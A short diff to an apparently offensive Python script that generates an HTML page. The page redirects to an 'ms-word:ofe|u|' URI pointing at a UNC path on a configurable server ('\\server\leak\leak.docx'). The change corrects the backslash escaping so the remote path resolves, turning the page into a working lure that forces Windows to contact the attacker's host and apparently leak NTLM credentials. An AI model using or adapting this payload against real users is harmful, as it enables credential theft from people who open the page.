@@ -166,7 +166,7 @@ def create_htm_handler(generate,server,filename):
 	file.write('''<!DOCTYPE html>
 <html>
 	<script>
-		location.href = 'ms-word:ofe|u|\\''' + server + '''\leak\leak.docx';
+		location.href = 'ms-word:ofe|u|\\\\''' + server + '''\\leak\\leak.docx';
 	</script>
 </html>''')
 	file.close()
